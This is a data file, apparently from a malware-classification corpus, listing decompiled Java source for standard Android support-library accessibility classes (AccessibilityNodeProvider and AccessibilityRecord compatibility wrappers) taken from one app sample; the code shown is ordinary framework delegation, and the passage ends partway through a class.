"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view.accessibility\AccessibilityNodeProviderCompatJellyBean.code","class AccessibilityNodeProviderCompatJellyBean { interface AccessibilityNodeInfoBridge {     Object createAccessibilityNodeInfo(    int i);     List<Object> findAccessibilityNodeInfosByText(    String str,    int i);     boolean performAction(    int i,    int i2,    Bundle bundle);   }   AccessibilityNodeProviderCompatJellyBean(){   }   public static Object newAccessibilityNodeProviderBridge(  final AccessibilityNodeInfoBridge bridge){     return new AccessibilityNodeProvider(){       @Override public AccessibilityNodeInfo createAccessibilityNodeInfo(      int virtualViewId){         return (AccessibilityNodeInfo)AccessibilityNodeInfoBridge.this.createAccessibilityNodeInfo(virtualViewId);       }       @Override public List<AccessibilityNodeInfo> findAccessibilityNodeInfosByText(      String text,      int virtualViewId){         return AccessibilityNodeInfoBridge.this.findAccessibilityNodeInfosByText(text,virtualViewId);       }       @Override public boolean performAction(      int virtualViewId,      int action,      Bundle arguments){         return AccessibilityNodeInfoBridge.this.performAction(virtualViewId,action,arguments);       }     } ;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view.accessibility\AccessibilityNodeProviderCompatKitKat.code","class AccessibilityNodeProviderCompatKitKat { interface AccessibilityNodeInfoBridge {     Object createAccessibilityNodeInfo(    int i);     List<Object> findAccessibilityNodeInfosByText(    String str,    int i);     Object findFocus(    int i);     boolean performAction(    int i,    int i2,    Bundle bundle);   }   AccessibilityNodeProviderCompatKitKat(){   }   public static Object newAccessibilityNodeProviderBridge(  final AccessibilityNodeInfoBridge bridge){     return new AccessibilityNodeProvider(){       @Override public AccessibilityNodeInfo createAccessibilityNodeInfo(      int virtualViewId){         return (AccessibilityNodeInfo)AccessibilityNodeInfoBridge.this.createAccessibilityNodeInfo(virtualViewId);       }       @Override public List<AccessibilityNodeInfo> findAccessibilityNodeInfosByText(      String text,      int virtualViewId){         return AccessibilityNodeInfoBridge.this.findAccessibilityNodeInfosByText(text,virtualViewId);       }       @Override public boolean performAction(      int virtualViewId,      int action,      Bundle arguments){         return AccessibilityNodeInfoBridge.this.performAction(virtualViewId,action,arguments);       }       @Override public AccessibilityNodeInfo findFocus(      int focus){         return (AccessibilityNodeInfo)AccessibilityNodeInfoBridge.this.findFocus(focus);       }     } ;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view.accessibility\AccessibilityNodeProviderImpl.code","interface AccessibilityNodeProviderImpl {   Object newAccessibilityNodeProviderBridge(  AccessibilityNodeProviderCompat accessibilityNodeProviderCompat); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view.accessibility\AccessibilityNodeProviderJellyBeanImpl.code","static class AccessibilityNodeProviderJellyBeanImpl extends AccessibilityNodeProviderStubImpl {   AccessibilityNodeProviderJellyBeanImpl(){   }   @Override public Object newAccessibilityNodeProviderBridge(  final AccessibilityNodeProviderCompat compat){     return AccessibilityNodeProviderCompatJellyBean.newAccessibilityNodeProviderBridge(new AccessibilityNodeProviderCompatJellyBean.AccessibilityNodeInfoBridge(){       @Override public boolean performAction(      int virtualViewId,      int action,      Bundle arguments){         return compat.performAction(virtualViewId,action,arguments);       }       @Override public List<Object> findAccessibilityNodeInfosByText(      String text,      int virtualViewId){         List<AccessibilityNodeInfoCompat> compatInfos=compat.findAccessibilityNodeInfosByText(text,virtualViewId);         List<Object> infos=new ArrayList<>();         int infoCount=compatInfos.size();         for (int i=0; i < infoCount; i++) {           AccessibilityNodeInfoCompat infoCompat=compatInfos.get(i);           infos.add(infoCompat.getInfo());         }         return infos;       }       @Override public Object createAccessibilityNodeInfo(      int virtualViewId){         AccessibilityNodeInfoCompat compatInfo=compat.createAccessibilityNodeInfo(virtualViewId);         if (compatInfo == null) {           return null;         }         return compatInfo.getInfo();       }     } );   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view.accessibility\AccessibilityNodeProviderKitKatImpl.code","static class AccessibilityNodeProviderKitKatImpl extends AccessibilityNodeProviderStubImpl {   AccessibilityNodeProviderKitKatImpl(){   }   @Override public Object newAccessibilityNodeProviderBridge(  final AccessibilityNodeProviderCompat compat){     return AccessibilityNodeProviderCompatKitKat.newAccessibilityNodeProviderBridge(new AccessibilityNodeProviderCompatKitKat.AccessibilityNodeInfoBridge(){       @Override public boolean performAction(      int virtualViewId,      int action,      Bundle arguments){         return compat.performAction(virtualViewId,action,arguments);       }       @Override public List<Object> findAccessibilityNodeInfosByText(      String text,      int virtualViewId){         List<AccessibilityNodeInfoCompat> compatInfos=compat.findAccessibilityNodeInfosByText(text,virtualViewId);         List<Object> infos=new ArrayList<>();         int infoCount=compatInfos.size();         for (int i=0; i < infoCount; i++) {           AccessibilityNodeInfoCompat infoCompat=compatInfos.get(i);           infos.add(infoCompat.getInfo());         }         return infos;       }       @Override public Object createAccessibilityNodeInfo(      int virtualViewId){         AccessibilityNodeInfoCompat compatInfo=compat.createAccessibilityNodeInfo(virtualViewId);         if (compatInfo == null) {           return null;         }         return compatInfo.getInfo();       }       @Override public Object findFocus(      int focus){         AccessibilityNodeInfoCompat compatInfo=compat.findFocus(focus);         if (compatInfo == null) {           return null;         }         return compatInfo.getInfo();       }     } );   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view.accessibility\AccessibilityNodeProviderStubImpl.code","static class AccessibilityNodeProviderStubImpl implements AccessibilityNodeProviderImpl {   AccessibilityNodeProviderStubImpl(){   }   @Override public Object newAccessibilityNodeProviderBridge(  AccessibilityNodeProviderCompat compat){     return null;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view.accessibility\AccessibilityRecordCompat.code","public class AccessibilityRecordCompat {   private static final AccessibilityRecordImpl IMPL;   private final Object mRecord; interface AccessibilityRecordImpl {     int getAddedCount(    Object obj);     CharSequence getBeforeText(    Object obj);     CharSequence getClassName(    Object obj);     CharSequence getContentDescription(    Object obj);     int getCurrentItemIndex(    Object obj);     int getFromIndex(    Object obj);     int getItemCount(    Object obj);     int getMaxScrollX(    Object obj);     int getMaxScrollY(    Object obj);     Parcelable getParcelableData(    Object obj);     int getRemovedCount(    Object obj);     int getScrollX(    Object obj);     int getScrollY(    Object obj);     AccessibilityNodeInfoCompat getSource(    Object obj);     List<CharSequence> getText(    Object obj);     int getToIndex(    Object obj);     int getWindowId(    Object obj);     boolean isChecked(    Object obj);     boolean isEnabled(    Object obj);     boolean isFullScreen(    Object obj);     boolean isPassword(    Object obj);     boolean isScrollable(    Object obj);     Object obtain();     Object obtain(    Object obj);     void recycle(    Object obj);     void setAddedCount(    Object obj,    int i);     void setBeforeText(    Object obj,    CharSequence charSequence);     void setChecked(    Object obj,    boolean z);     void setClassName(    Object obj,    CharSequence charSequence);     void setContentDescription(    Object obj,    CharSequence charSequence);     void setCurrentItemIndex(    Object obj,    int i);     void setEnabled(    Object obj,    boolean z);     void setFromIndex(    Object obj,    int i);     void setFullScreen(    Object obj,    boolean z);     void setItemCount(    Object obj,    int i);     void setMaxScrollX(    Object obj,    int i);     void setMaxScrollY(    Object obj,    int i);     void setParcelableData(    Object obj,    Parcelable parcelable);     void setPassword(    Object obj,    boolean z);     void setRemovedCount(    Object obj,    int i);     void setScrollX(    Object obj,    int i);     void setScrollY(    Object obj,    int i);     void setScrollable(    Object obj,    boolean z);     void setSource(    Object obj,    View view);     void setSource(    Object obj,    View view,    int i);     void setToIndex(    Object obj,    int i);   } static class AccessibilityRecordStubImpl implements AccessibilityRecordImpl {     AccessibilityRecordStubImpl(){     }     @Override public Object obtain(){       return null;     }     @Override public Object obtain(    Object record){       return null;     }     @Override public int getAddedCount(    Object record){       return 0;     }     @Override public CharSequence getBeforeText(    Object record){       return null;     }     @Override public CharSequence getClassName(    Object record){       return null;     }     @Override public CharSequence getContentDescription(    Object record){       return null;     }     @Override public int getCurrentItemIndex(    Object record){       return 0;     }     @Override public int getFromIndex(    Object record){       return 0;     }     @Override public int getItemCount(    Object record){       return 0;     }     @Override public int getMaxScrollX(    Object record){       return 0;     }     @Override public int getMaxScrollY(    Object record){       return 0;     }     @Override public Parcelable getParcelableData(    Object record){       return null;     }     @Override public int getRemovedCount(    Object record){       return 0;     }     @Override public int getScrollX(    Object record){       return 0;     }     @Override public int getScrollY(    Object record){       return 0;     }     @Override public AccessibilityNodeInfoCompat getSource(    Object record){       return null;     }     @Override public List<CharSequence> getText(    Object record){       return Collections.emptyList();     }     @Override public int getToIndex(    Object record){       return 0;     }     @Override public int getWindowId(    Object record){       return 0;     }     @Override public boolean isChecked(    Object record){       return false;     }     @Override public boolean isEnabled(    Object record){       return false;     }     @Override public boolean isFullScreen(    Object record){       return false;     }     @Override public boolean isPassword(    Object record){       return false;     }     @Override public boolean isScrollable(    Object record){       return false;     }     @Override public void recycle(    Object record){     }     @Override public void setAddedCount(    Object record,    int addedCount){     }     @Override public void setBeforeText(    Object record,    CharSequence beforeText){     }     @Override public void setChecked(    Object record,    boolean isChecked){     }     @Override public void setClassName(    Object record,    CharSequence className){     }     @Override public void setContentDescription(    Object record,    CharSequence contentDescription){     }     @Override public void setCurrentItemIndex(    Object record,    int currentItemIndex){     }     @Override public void setEnabled(    Object record,    boolean isEnabled){     }     @Override public void setFromIndex(    Object record,    int fromIndex){     }     @Override public void setFullScreen(    Object record,    boolean isFullScreen){     }     @Override public void setItemCount(    Object record,    int itemCount){     }     @Override public void setMaxScrollX(    Object record,    int maxScrollX){     }     @Override public void setMaxScrollY(    Object record,    int maxScrollY){     }     @Override public void setParcelableData(    Object record,    Parcelable parcelableData){     }     @Override public void setPassword(    Object record,    boolean isPassword){     }     @Override public void setRemovedCount(    Object record,    int removedCount){     }     @Override public void setScrollX(    Object record,    int scrollX){     }     @Override public void setScrollY(    Object record,    int scrollY){     }     @Override public void setScrollable(    Object record,    boolean scrollable){     }     @Override public void setSource(    Object record,    View source){     }     @Override public void setSource(    Object record,    View root,    int virtualDescendantId){     }     @Override public void setToIndex(    Object record,    int toIndex){     }   } static class AccessibilityRecordIcsImpl extends AccessibilityRecordStubImpl {     AccessibilityRecordIcsImpl(){     }     @Override public Object obtain(){       return AccessibilityRecordCompatIcs.obtain();     }     @Override public Object obtain(    Object record){       return AccessibilityRecordCompatIcs.obtain(record);     }     @Override public int getAddedCount(    Object record){       return AccessibilityRecordCompatIcs.getAddedCount(record);     }     @Override public CharSequence getBeforeText(    Object record){       return AccessibilityRecordCompatIcs.getBeforeText(record);     }     @Override public CharSequence getClassName(    Object record){       return AccessibilityRecordCompatIcs.getClassName(record);     }     @Override public CharSequence getContentDescription(    Object record){       return AccessibilityRecordCompatIcs.getContentDescription(record);     }     @Override public int getCurrentItemIndex(    Object record){       return AccessibilityRecordCompatIcs.getCurrentItemIndex(record);     }     @Override public int getFromIndex(    Object record){       return AccessibilityRecordCompatIcs.getFromIndex(record);     }     @Override public int getItemCount(    Object record){       return AccessibilityRecordCompatIcs.getItemCount(record);     }     @Override public Parcelable getParcelableData(    Object record){       return AccessibilityRecordCompatIcs.getParcelableData(record);     }     @Override public int getRemovedCount(    Object record){       return AccessibilityRecordCompatIcs.getRemovedCount(record);     }     @Override public int getScrollX(    Object record){       return AccessibilityRecordCompatIcs.getScrollX(record);     }     @Override public int getScrollY(    Object record){       return AccessibilityRecordCompatIcs.getScrollY(record);     }     @Override public AccessibilityNodeInfoCompat getSource(    Object record){       return AccessibilityNodeInfoCompat.wrapNonNullInstance(AccessibilityRecordCompatIcs.getSource(record));     }     @Override public List<CharSequence> getText(    Object record){       return AccessibilityRecordCompatIcs.getText(record);     }     @Override public int getToIndex(    Object record){       return AccessibilityRecordCompatIcs.getToIndex(record);     }     @Override public int getWindowId(    Object record){       return AccessibilityRecordCompatIcs.getWindowId(record);     }     @Override public boolean isChecked(    Object record){       return AccessibilityRecordCompatIcs.isChecked(record);     }     @Override public boolean isEnabled(    Object record){       return AccessibilityRecordCompatIcs.isEnabled(record);     }     @Override public boolean isFullScreen(    Object record){       return AccessibilityRecordCompatIcs.isFullScreen(record);     }     @Override public boolean isPassword(    Object record){       return AccessibilityRecordCompatIcs.isPassword(record);     }     @Override public boolean isScrollable(    Object record){       return AccessibilityRecordCompatIcs.isScrollable(record);     }     @Override public void recycle(    Object record){       AccessibilityRecordCompatIcs.recycle(record);     }     @Override public void setAddedCount(    Object record,    int addedCount){       AccessibilityRecordCompatIcs.setAddedCount(record,addedCount);     }     @Override public void setBeforeText(    Object record,    CharSequence beforeText){       AccessibilityRecordCompatIcs.setBeforeText(record,beforeText);     }     @Override public void setChecked(    Object record,    boolean isChecked){       AccessibilityRecordCompatIcs.setChecked(record,isChecked);     }     @Override public void setClassName(    Object record,    CharSequence className){       AccessibilityRecordCompatIcs.setClassName(record,className);     }     @Override public void setContentDescription(    Object record,    CharSequence contentDescription){       AccessibilityRecordCompatIcs.setContentDescription(record,contentDescription);     }     @Override public void setCurrentItemIndex(    Object record,    int currentItemIndex){       AccessibilityRecordCompatIcs.setCurrentItemIndex(record,currentItemIndex);     }     @Override public void setEnabled(    Object record,    boolean isEnabled){       AccessibilityRecordCompatIcs.setEnabled(record,isEnabled);     }     @Override public void setFromIndex(    Object record,    int fromIndex){       AccessibilityRecordCompatIcs.setFromIndex(record,fromIndex);     }     @Override public void setFullScreen(    Object record,    boolean isFullScreen){       AccessibilityRecordCompatIcs.setFullScreen(record,isFullScreen);     }     @Override public void setItemCount(    Object record,    int itemCount){       AccessibilityRecordCompatIcs.setItemCount(record,itemCount);     }     @Override public void setParcelableData(    Object record,    Parcelable parcelableData){       AccessibilityRecordCompatIcs.setParcelableData(record,parcelableData);     }     @Override public void setPassword(    Object record,    boolean isPassword){       AccessibilityRecordCompatIcs.setPassword(record,isPassword);     }     @Override public void setRemovedCount(    Object record,    int removedCount){       AccessibilityRecordCompatIcs.setRemovedCount(record,removedCount);     }     @Override public void setScrollX(    Object record,    int scrollX){       AccessibilityRecordCompatIcs.setScrollX(record,scrollX);     }     @Override public void setScrollY(    Object record,    int scrollY){       AccessibilityRecordCompatIcs.setScrollY(record,scrollY);     }     @Override public void setScrollable(    Object record,    boolean scrollable){       AccessibilityRecordCompatIcs.setScrollable(record,scrollable);     }     @Override public void setSource(    Object record,    View source){       AccessibilityRecordCompatIcs.setSource(record,source);     }     @Override public void setToIndex(    Object record,    int toIndex){       AccessibilityRecordCompatIcs.setToIndex(record,toIndex);     }   } static class AccessibilityRecordIcsMr1Impl extends AccessibilityRecordIcsImpl {     AccessibilityRecordIcsMr1Impl(){     }     @Override public int getMaxScrollX(    Object record){       return AccessibilityRecordCompatIcsMr1.getMaxScrollX(record);     }     @Override public int getMaxScrollY(    Object record){       return AccessibilityRecordCompatIcsMr1.getMaxScrollY(record);     }     @Override public void setMaxScrollX(    Object record,    int maxScrollX){       AccessibilityRecordCompatIcsMr1.setMaxScrollX(record,maxScrollX);     }     @Override public void setMaxScrollY(    Object record,    int maxScrollY){       AccessibilityRecordCompatIcsMr1.setMaxScrollY(record,maxScrollY);     }   } static class AccessibilityRecordJellyBeanImpl extends AccessibilityRecordIcsMr1Impl {     AccessibilityRecordJellyBeanImpl(){     }     @Override public void setSource(    Object record,    View root,    int virtualDescendantId){       AccessibilityRecordCompatJellyBean.setSource(record,root,virtualDescendantId);     }   } static {     if (Build.VERSION.SDK_INT >= 16) {       IMPL=new AccessibilityRecordJellyBeanImpl();       return;     }     if (Build.VERSION.SDK_INT >= 15) {       IMPL=new AccessibilityRecordIcsMr1Impl();     }  else     if (Build.VERSION.SDK_INT >= 14) {       IMPL=new AccessibilityRecordIcsImpl();     }  else {       IMPL=new AccessibilityRecordStubImpl();     }   }   public AccessibilityRecordCompat(  Object record){     this.mRecord=record;   }   public Object getImpl(){     return this.mRecord;   }   public static AccessibilityRecordCompat obtain(  AccessibilityRecordCompat record){     return new AccessibilityRecordCompat(IMPL.obtain(record.mRecord));   }   public static AccessibilityRecordCompat obtain(){     return new AccessibilityRecordCompat(IMPL.obtain());   }   public void setSource(  View source){     IMPL.setSource(this.mRecord,source);   }   public void setSource(  View root,  int virtualDescendantId){     IMPL.setSource(this.mRecord,root,virtualDescendantId);   }   public AccessibilityNodeInfoCompat getSource(){     return IMPL.getSource(this.mRecord);   }   public int getWindowId(){     return IMPL.getWindowId(this.mRecord);   }   public boolean isChecked(){     return IMPL.isChecked(this.mRecord);   }   public void setChecked(  boolean isChecked){     IMPL.setChecked(this.mRecord,isChecked);   }   public boolean isEnabled(){     return IMPL.isEnabled(this.mRecord);   }   public void setEnabled(  boolean isEnabled){     IMPL.setEnabled(this.mRecord,isEnabled);   }   public boolean isPassword(){     return IMPL.isPassword(this.mRecord);   }   public void setPassword(  boolean isPassword){     IMPL.setPassword(this.mRecord,isPassword);   }   public boolean isFullScreen(){     return IMPL.isFullScreen(this.mRecord);   }   public void setFullScreen(  boolean isFullScreen){     IMPL.setFullScreen(this.mRecord,isFullScreen);   }   public boolean isScrollable(){     return IMPL.isScrollable(this.mRecord);   }   public void setScrollable(  boolean scrollable){     IMPL.setScrollable(this.mRecord,scrollable);   }   public int getItemCount(){     return IMPL.getItemCount(this.mRecord);   }   public void setItemCount(  int itemCount){     IMPL.setItemCount(this.mRecord,itemCount);   }   public int getCurrentItemIndex(){     return IMPL.getCurrentItemIndex(this.mRecord);   }   public void setCurrentItemIndex(  int currentItemIndex){     IMPL.setCurrentItemIndex(this.mRecord,currentItemIndex);   }   public int getFromIndex(){     return IMPL.getFromIndex(this.mRecord);   }   public void setFromIndex(  int fromIndex){     IMPL.setFromIndex(this.mRecord,fromIndex);   }   public int getToIndex(){     return IMPL.getToIndex(this.mRecord);   }   public void setToIndex(  int toIndex){     IMPL.setToIndex(this.mRecord,toIndex);   }   public int getScrollX(){     return IMPL.getScrollX(this.mRecord);   }   public void setScrollX(  int scrollX){     IMPL.setScrollX(this.mRecord,scrollX);   }   public int getScrollY(){     return IMPL.getScrollY(this.mRecord);   }   public void setScrollY(  int scrollY){     IMPL.setScrollY(this.mRecord,scrollY);   }   public int getMaxScrollX(){     return IMPL.getMaxScrollX(this.mRecord);   }   public void setMaxScrollX(  int maxScrollX){     IMPL.setMaxScrollX(this.mRecord,maxScrollX);   }   public int getMaxScrollY(){     return IMPL.getMaxScrollY(this.mRecord);   }   public void setMaxScrollY(  int maxScrollY){     IMPL.setMaxScrollY(this.mRecord,maxScrollY);   }   public int getAddedCount(){     return IMPL.getAddedCount(this.mRecord);   }   public void setAddedCount(  int addedCount){     IMPL.setAddedCount(this.mRecord,addedCount);   }   public int getRemovedCount(){     return IMPL.getRemovedCount(this.mRecord);   }   public void setRemovedCount(  int removedCount){     IMPL.setRemovedCount(this.mRecord,removedCount);   }   public CharSequence getClassName(){     return IMPL.getClassName(this.mRecord);   }   public void setClassName(  CharSequence className){     IMPL.setClassName(this.mRecord,className);   }   public List<CharSequence> getText(){     return IMPL.getText(this.mRecord);   }   public CharSequence getBeforeText(){     return IMPL.getBeforeText(this.mRecord);   }   public void setBeforeText(  CharSequence beforeText){     IMPL.setBeforeText(this.mRecord,beforeText);   }   public CharSequence getContentDescription(){     return IMPL.getContentDescription(this.mRecord);   }   public void setContentDescription(  CharSequence contentDescription){     IMPL.setContentDescription(this.mRecord,contentDescription);   }   public Parcelable getParcelableData(){     return IMPL.getParcelableData(this.mRecord);   }   public void setParcelableData(  Parcelable parcelableData){     IMPL.setParcelableData(this.mRecord,parcelableData);   }   public void recycle(){     IMPL.recycle(this.mRecord);   }   public int hashCode(){     if (this.mRecord == null) {       return 0;     }     return this.mRecord.hashCode();   }   public boolean equals(  Object obj){     if (this == obj) {       return true;     }     if (obj != null && getClass() == obj.getClass()) {       AccessibilityRecordCompat other=(AccessibilityRecordCompat)obj;       return this.mRecord == null ? other.mRecord == null : this.mRecord.equals(other.mRecord);     }     return false;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view.accessibility\AccessibilityRecordCompatIcs.code","class AccessibilityRecordCompatIcs {   AccessibilityRecordCompatIcs(){   }   public static Object obtain(){     return AccessibilityRecord.obtain();   }   public static Object obtain(  Object record){     return AccessibilityRecord.obtain((AccessibilityRecord)record);   }   public static int getAddedCount(  Object record){     return ((AccessibilityRecord)record).getAddedCount();   }   public static CharSequence getBeforeText(  Object record){     return ((AccessibilityRecord)record).getBeforeText();   }   public static CharSequence getClassName(  Object record){     return ((AccessibilityRecord)record).getClassName();   }   public static CharSequence getContentDescription(  Object record){     return ((AccessibilityRecord)record).getContentDescription();   }   public static int getCurrentItemIndex(  Object record){     return ((AccessibilityRecord)record).getCurrentItemIndex();   }   public static int getFromIndex(  Object record){     return ((AccessibilityRecord)record).getFromIndex();   }   public static int getItemCount(  Object record){     return ((AccessibilityRecord)record).getItemCount();   }   public static Parcelable getParcelableData(  Object record){     return ((AccessibilityRecord)record).getParcelableData();   }   public static int getRemovedCount(  Object record){     return ((AccessibilityRecord)record).getRemovedCount();   }   public static int getScrollX(  Object record){     return ((AccessibilityRecord)record).getScrollX();   }   public static int getScrollY(  Object record){     return ((AccessibilityRecord)record).getScrollY();   }   public static Object getSource(  Object record){     return ((AccessibilityRecord)record).getSource();   }   public static List<CharSequence> getText(  Object record){     return ((AccessibilityRecord)record).getText();   }   public static int getToIndex(  Object record){     return ((AccessibilityRecord)record).getToIndex();   }   public static int getWindowId(  Object record){     return ((AccessibilityRecord)record).getWindowId();   }   public static boolean isChecked(  Object record){     return ((AccessibilityRecord)record).isChecked();   }   public static boolean isEnabled(  Object record){     return ((AccessibilityRecord)record).isEnabled();   }   public static boolean isFullScreen(  Object record){     return ((AccessibilityRecord)record).isFullScreen();   }   public static boolean isPassword(  Object record){     return ((AccessibilityRecord)record).isPassword();   }   public static boolean isScrollable(  Object record){     return ((AccessibilityRecord)record).isScrollable();   }   public static void recycle(  Object record){     ((AccessibilityRecord)record).recycle();   }   public static void setAddedCount(  Object record,  int addedCount){     ((AccessibilityRecord)record).setAddedCount(addedCount);   }   public static void setBeforeText(  Object record,  CharSequence beforeText){     ((AccessibilityRecord)record).setBeforeText(beforeText);   }   public static void setChecked(  Object record,  boolean isChecked){     ((AccessibilityRecord)record).setChecked(isChecked);   }   public static void setClassName(  Object record,  CharSequence className){     ((AccessibilityRecord)record).setClassName(className);   }   public static void setContentDescription(  Object record,  CharSequence contentDescription){     ((AccessibilityRecord)record).setContentDescription(contentDescription);   }   public static void setCurrentItemIndex(  Object record,  int currentItemIndex){     ((AccessibilityRecord)record).setCurrentItemIndex(currentItemIndex);   }   public static void setEnabled(  Object record,  boolean isEnabled){     ((AccessibilityRecord)record).setEnabled(isEnabled);   }   public static void setFromIndex(  Object record,  int fromIndex){     ((AccessibilityRecord)record).setFromIndex(fromIndex);   }   public static void setFullScreen(  Object record,  boolean isFullScreen){     ((AccessibilityRecord)record).setFullScreen(isFullScreen);   }   public static void setItemCount(  Object record,  int itemCount){     ((AccessibilityRecord)record).setItemCount(itemCount);   }   public static void setParcelableData(  Object record,  Parcelable parcelableData){     ((AccessibilityRecord)record).setParcelableData(parcelableData);   }   public static void setPassword(  Object record,  boolean isPassword){     ((AccessibilityRecord)record).setPassword(isPassword);   }   public static void setRemovedCount(  Object record,  int removedCount){     ((AccessibilityRecord)record).setRemovedCount(removedCount);   }   public static void setScrollX(  Object record,  int scrollX){     ((AccessibilityRecord)record).setScrollX(scrollX);   }   public static void setScrollY(  Object record,  int scrollY){     ((AccessibilityRecord)record).setScrollY(scrollY);   }   public static void setScrollable(  Object record,  boolean scrollable){     ((AccessibilityRecord)record).setScrollable(scrollable);   }   public static void setSource(  Object record,  View source){     ((AccessibilityRecord)record).setSource(source);   }   public static void setToIndex(  Object record,  int toIndex){     ((AccessibilityRecord)record).setToIndex(toIndex);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view.accessibility\AccessibilityRecordCompatIcsMr1.code","class AccessibilityRecordCompatIcsMr1 {   AccessibilityRecordCompatIcsMr1(){   }   public static int getMaxScrollX(  Object record){     return ((AccessibilityRecord)record).getMaxScrollX();   }   public static int getMaxScrollY(  Object record){     return ((AccessibilityRecord)record).getMaxScrollY();   }   public static void setMaxScrollX(  Object record,  int maxScrollX){     ((AccessibilityRecord)record).setMaxScrollX(maxScrollX);   }   public static void setMaxScrollY(  Object record,  int maxScrollY){     ((AccessibilityRecord)record).setMaxScrollY(maxScrollY);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view.accessibility\AccessibilityRecordCompatJellyBean.code","class AccessibilityRecordCompatJellyBean {   AccessibilityRecordCompatJellyBean(){   }   public static void setSource(  Object record,  View root,  int virtualDescendantId){     ((AccessibilityRecord)record).setSource(root,virtualDescendantId);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view.accessibility\AccessibilityRecordIcsImpl.code","static class AccessibilityRecordIcsImpl extends AccessibilityRecordStubImpl {   AccessibilityRecordIcsImpl(){   }   @Override public Object obtain(){     return AccessibilityRecordCompatIcs.obtain();   }   @Override public Object obtain(  Object record){     return AccessibilityRecordCompatIcs.obtain(record);   }   @Override public int getAddedCount(  Object record){     return AccessibilityRecordCompatIcs.getAddedCount(record);   }   @Override public CharSequence getBeforeText(  Object record){     return AccessibilityRecordCompatIcs.getBeforeText(record);   }   @Override public CharSequence getClassName(  Object record){     return AccessibilityRecordCompatIcs.getClassName(record);   }   @Override public CharSequence getContentDescription(  Object record){     return AccessibilityRecordCompatIcs.getContentDescription(record);   }   @Override public int getCurrentItemIndex(  Object record){     return AccessibilityRecordCompatIcs.getCurrentItemIndex(record);   }   @Override public int getFromIndex(  Object record){     return AccessibilityRecordCompatIcs.getFromIndex(record);   }   @Override public int getItemCount(  Object record){     return AccessibilityRecordCompatIcs.getItemCount(record);   }   @Override public Parcelable getParcelableData(  Object record){     return AccessibilityRecordCompatIcs.getParcelableData(record);   }   @Override public int getRemovedCount(  Object record){     return AccessibilityRecordCompatIcs.getRemovedCount(record);   }   @Override public int getScrollX(  Object record){     return AccessibilityRecordCompatIcs.getScrollX(record);   }   @Override public int getScrollY(  Object record){     return AccessibilityRecordCompatIcs.getScrollY(record);   }   @Override public AccessibilityNodeInfoCompat getSource(  Object record){     return AccessibilityNodeInfoCompat.wrapNonNullInstance(AccessibilityRecordCompatIcs.getSource(record));   }   @Override public List<CharSequence> getText(  Object record){     return AccessibilityRecordCompatIcs.getText(record);   }   @Override public int getToIndex(  Object record){     return AccessibilityRecordCompatIcs.getToIndex(record);   }   @Override public int getWindowId(  Object record){     return AccessibilityRecordCompatIcs.getWindowId(record);   }   @Override public boolean isChecked(  Object record){     return AccessibilityRecordCompatIcs.isChecked(record);   }   @Override public boolean isEnabled(  Object record){     return AccessibilityRecordCompatIcs.isEnabled(record);   }   @Override public boolean isFullScreen(  Object record){     return AccessibilityRecordCompatIcs.isFullScreen(record);   }   @Override public boolean isPassword(  Object record){     return AccessibilityRecordCompatIcs.isPassword(record);   }   @Override public boolean isScrollable(  Object record){     return AccessibilityRecordCompatIcs.isScrollable(record);   }   @Override public void recycle(  Object record){     AccessibilityRecordCompatIcs.recycle(record);   }   @Override public void setAddedCount(  Object record,  int addedCount){     AccessibilityRecordCompatIcs.setAddedCount(record,addedCount);   }   @Override public void setBeforeText(  Object record,  CharSequence beforeText){     AccessibilityRecordCompatIcs.setBeforeText(record,beforeText);   }   @Override public void setChecked(  Object record,  boolean isChecked){     AccessibilityRecordCompatIcs.setChecked(record,isChecked);   }   @Override public void setClassName(  Object record,  CharSequence className){     AccessibilityRecordCompatIcs.setClassName(record,className);   }   @Override public void setContentDescription(  Object record,  CharSequence contentDescription){     AccessibilityRecordCompatIcs.setContentDescription(record,contentDescription);   }   @Override public void setCurrentItemIndex(  Object record,  int currentItemIndex){     AccessibilityRecordCompatIcs.setCurrentItemIndex(record,currentItemIndex);   }   @Override public void setEnabled(  Object record,  boolean isEnabled){     AccessibilityRecordCompatIcs.setEnabled(record,isEnabled);   }   @Override public void setFromIndex(  Object record,  int fromIndex){     AccessibilityRecordCompatIcs.setFromIndex(record,fromIndex);   }   @Override public void setFullScreen(  Object record,  boolean isFullScreen){     AccessibilityRecordCompatIcs.setFullScreen(record,isFullScreen);   }   @Override public void setItemCount(  Object record,  int itemCount){     AccessibilityRecordCompatIcs.setItemCount(record,itemCount);   }   @Override public void setParcelableData(  Object record,  Parcelable parcelableData){     AccessibilityRecordCompatIcs.setParcelableData(record,parcelableData);   }   @Override public void setPassword(  Object record,  boolean isPassword){     AccessibilityRecordCompatIcs.setPassword(record,isPassword);   }   @Override public void setRemovedCount(  Object record,  int removedCount){     AccessibilityRecordCompatIcs.setRemovedCount(record,removedCount);   }   @Override public void setScrollX(  Object record,  int scrollX){     AccessibilityRecordCompatIcs.setScrollX(record,scrollX);   }   @Override public void setScrollY(  Object record,  int scrollY){     AccessibilityRecordCompatIcs.setScrollY(record,scrollY);   